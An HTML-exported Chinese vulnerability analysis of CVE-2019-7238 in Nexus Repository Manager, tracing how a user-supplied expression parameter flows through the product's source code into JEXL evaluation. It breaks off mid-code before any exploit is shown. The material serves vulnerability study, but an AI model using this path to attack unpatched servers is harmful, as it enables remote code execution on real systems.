<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X0506895070365da4946d4d7c0d4b2c787f81399"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-7238</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Nexus Repository Manager </span><span class="csECDA2D3">远程代码执行</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Nexus Repository Manager OSS/Pro 3.6.2 </span><span class="cs9C1B1871">版本到</span><span class="cs8926E06"> 3.14.0 </span><span class="cs9C1B1871">版本</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">定位到如下位置</span><span class="cs8926E06"> plugins/nexus-coreui-plugin/src/main/java/org/sonatype/nexus/coreui/ComponentComponent.groovy:185</span></p><p class="cs3A447A38"><span class="cs9FB05234">@Named</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@Singleton</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@DirectAction(action = &#39;coreui_Component&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">class ComponentComponent</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;extends DirectComponentSupport</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@DirectMethod</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Timed</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@ExceptionMetered</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;PagedResponse&lt;AssetXO&gt; previewAssets(final StoreLoadParameters parameters) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String repositoryName = parameters.getFilter(&#39;repositoryName&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String expression = parameters.getFilter(&#39;expression&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String type = parameters.getFilter(&#39;type&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">接收三个参数</span><span class="cs9FB05234"> repositoryName </span><span class="cs7FFD2630">、</span><span class="cs9FB05234"> expression </span><span class="cs7FFD2630">、</span><span class="cs9FB05234"> type</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!expression || !type || !repositoryName) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">设置</span><span class="cs9FB05234"> repositoryName</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RepositorySelector repositorySelector = RepositorySelector.fromSelector(repositoryName)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">根据</span><span class="cs9FB05234"> type </span><span class="cs7FFD2630">分别调用不同的</span><span class="cs9FB05234"> validate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (type == JexlSelector.TYPE) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jexlExpressionValidator.validate(expression)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if (type == CselSelector.TYPE) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cselExpressionValidator.validate(expression)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&lt;Repository&gt; selectedRepositories = getPreviewRepositories(repositorySelector)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!selectedRepositories.size()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def result = browseService.previewAssets(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;repositorySelector,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;selectedRepositories,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;expression,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;toQueryOptions(parameters))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new PagedResponse&lt;AssetXO&gt;(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result.total,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result.results.collect(ASSET_CONVERTER.rcurry(null, null, [:], 0)) // buckets not needed for asset preview screen</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Nexus</span><span class="cs9C1B1871">为了查询方便，特地在</span><span class="cs8926E06">jexl</span><span class="cs9C1B1871">的基础上引入了</span><span class="cs8926E06">csel</span><span class="cs9C1B1871">表达式。简单起见，这里不做展开。接着我们跟入</span><span class="cs9FB05234">browseService.previewAssets</span><span class="cs9C1B1871">，接口定义在</span><span class="cs8926E06"> components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/BrowseService.java:59</span></p><p class="cs3A447A38"><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;* Returns a {@link BrowseResult} for previewing the specified repository based on an arbitrary content selector.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;BrowseResult&lt;Asset&gt; previewAssets(final RepositorySelector selectedRepository,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final List&lt;Repository&gt; repositories,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final String jexlExpression,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final QueryOptions queryOptions);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">具体实现在</span><span class="cs8926E06"> components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/BrowseServiceImpl.java:233</span></p><p class="cs3A447A38"><span class="cs9FB05234">@Named</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@Singleton</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public class BrowseServiceImpl</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;extends ComponentSupport</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;implements BrowseService</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public BrowseResult&lt;Asset&gt; previewAssets(final RepositorySelector repositorySelector,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final List&lt;Repository&gt; repositories,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final String jexlExpression,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final QueryOptions queryOptions)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;checkNotNull(repositories);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;checkNotNull(jexlExpression);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;final Repository repository = repositories.get(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try (StorageTx storageTx = repository.facet(StorageFacet.class).txSupplier().get()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storageTx.begin();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&lt;Repository&gt; previewRepositories;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (repositories.size() == 1 &amp;&amp; groupType.equals(repository.getType())) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;previewRepositories = repository.facet(GroupFacet.class).leafMembers();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;previewRepositories = repositories;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PreviewAssetsSqlBuilder builder = new PreviewAssetsSqlBuilder(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;repositorySelector,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jexlExpression,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;queryOptions,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getRepoToContainedGroupMap(repositories));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String whereClause = String.format(&quot;and (%s)&quot;, builder.buildWhereClause());</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//The whereClause is passed in as the querySuffix so that contentExpression will run after repository filtering</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new BrowseResult&lt;&gt;(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storageTx.countAssets(null, builder.buildSqlParams(), previewRepositories, whereClause),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Lists.newArrayList(storageTx.findAssets(null, builder.buildSqlParams(),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;previewRepositories, whereClause + builder.buildQuerySuffix()))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意上面代码中的英文注释，大意为</span><span class="cs9FB05234">whereClause</span><span class="cs9C1B1871">条件在完成</span><span class="cs9FB05234">repository filtering</span><span class="cs9C1B1871">后将会进行</span><span class="cs9FB05234">contentExpression</span><span class="cs9C1B1871">。而</span><span class="cs9FB05234">whereClause</span><span class="cs9C1B1871">是通过前面一系列</span><span class="cs8926E06">Builder</span><span class="cs9C1B1871">构建的。可以跟入</span><span class="cs9FB05234">builder.buildWhereClause()</span><span class="cs9C1B1871">，在</span><span class="cs8926E06"> components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/PreviewAssetsSqlBuilder.java:51 </span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这里最终引入了</span><span class="cs8926E06">contentExpression</span><span class="cs9C1B1871">和</span><span class="cs8926E06">jexlExpression:</span></p><p class="cs3A447A38"><span class="cs9FB05234">public class PreviewAssetsSqlBuilder</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public String buildWhereClause() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return whereClause(&quot;contentExpression(@this, :jexlExpression, :repositorySelector, &quot; +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;:repoToContainedGroupMap) == true&quot;, queryOptions.getFilter() != null);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来即考虑如何进一步执行</span><span class="cs9FB05234">contentExpression</span><span class="cs9C1B1871">。在</span><span class="cs8926E06"> components/nexus-repository/src/main/java/org/sonatype/nexus/repository/selector/internal/ContentExpressionFunction.java </span><span class="cs9C1B1871">。当</span><span class="cs9FB05234">contentExpression</span><span class="cs9C1B1871">执行时，会调用</span><span class="cs9FB05234">execute</span><span class="cs9C1B1871">方法：</span></p><p class="cs3A447A38"><span class="cs9FB05234">public class ContentExpressionFunction</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;extends OSQLFunctionAbstract</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public static final String NAME = &quot;contentExpression&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;@Inject</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public ContentExpressionFunction(final VariableResolverAdapterManager variableResolverAdapterManager,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final SelectorManager selectorManager,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final ContentAuthHelper contentAuthHelper)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;super(NAME, 4, 4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.variableResolverAdapterManager = checkNotNull(variableResolverAdapterManager);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.selectorManager = checkNotNull(selectorManager);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.contentAuthHelper = checkNotNull(contentAuthHelper);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public Object execute(final Object iThis,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final OIdentifiable iCurrentRecord,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final Object iCurrentResult,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final Object[] iParams,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final OCommandContext iContext)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;OIdentifiable identifiable = (OIdentifiable) iParams[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// asset </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ODocument asset = identifiable.getRecord();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RepositorySelector repositorySelector = RepositorySelector.fromSelector((String) iParams[2]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// jexlExpression </span><span class="cs7FFD2630">即</span><span class="cs9FB05234"> iParams[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;String jexlExpression = (String) iParams[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;List&lt;String&gt; membersForAuth;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return contentAuthHelper.checkAssetPermissions(asset, membersForAuth.toArray(new String[membersForAuth.size()])) &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkJexlExpression(asset, jexlExpression, asset.field(AssetEntityAdapter.P_FORMAT, String.class));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中的</span><span class="cs9FB05234">iParams</span><span class="cs9C1B1871">即可对应传入的参数。</span><span class="cs9FB05234">iParams[0]</span><span class="cs9C1B1871">即</span><span class="cs9FB05234">@this</span><span class="cs8926E06"> , </span><span class="cs9FB05234">iParams[1]</span><span class="cs9C1B1871">即</span><span class="cs9FB05234">jexlExpression</span><span class="cs8926E06">, </span><span class="cs9FB05234">iParams[2]</span><span class="cs9C1B1871">即</span><span class="cs9FB05234">repositorySelector</span><span class="cs9C1B1871">。在完成初步筛选出</span><span class="cs9FB05234">asset</span><span class="cs9C1B1871">后进入最后的</span><span class="cs9FB05234">checkJexlExpression</span></p><p class="cs3A447A38"><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;private boolean checkJexlExpression(final ODocument asset,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final String jexlExpression,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 